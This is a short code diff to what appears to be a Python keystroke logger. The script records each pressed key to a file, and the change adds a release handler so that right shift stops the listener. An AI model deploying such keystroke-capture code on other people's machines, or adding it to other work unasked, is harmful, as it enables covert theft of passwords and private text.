@@ -11,8 +11,13 @@ def on_press(key) -> None:
         file.write('\n' if key == 'space' else key)
 
 
+def on_release(key) -> bool | None:
+    key = convert_key(key)
+    return False if key == 'shift_r' else None
+
+
 def keyboard_listener() -> None:
-    with Listener(on_press=on_press, on_release=None) as keyboard:
+    with Listener(on_press=on_press, on_release=on_release) as keyboard:
         keyboard.join()
 
 
